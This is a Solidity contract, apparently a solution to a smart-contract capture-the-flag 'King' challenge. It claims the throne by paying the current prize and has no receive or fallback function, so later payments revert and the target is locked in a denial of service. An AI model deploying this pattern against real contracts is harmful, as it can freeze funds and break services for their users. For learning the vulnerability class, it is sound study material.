// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract Pwn {

    address payable private immutable target;

    constructor(address payable _target) {
        target = _target;
    }

    function pwn() payable external {
        uint prize = King(target).prize();
        (bool success,) = target.call{value: prize}("");
        require(success, "call failed");
    }

    // no receive()
    // no fallback()
}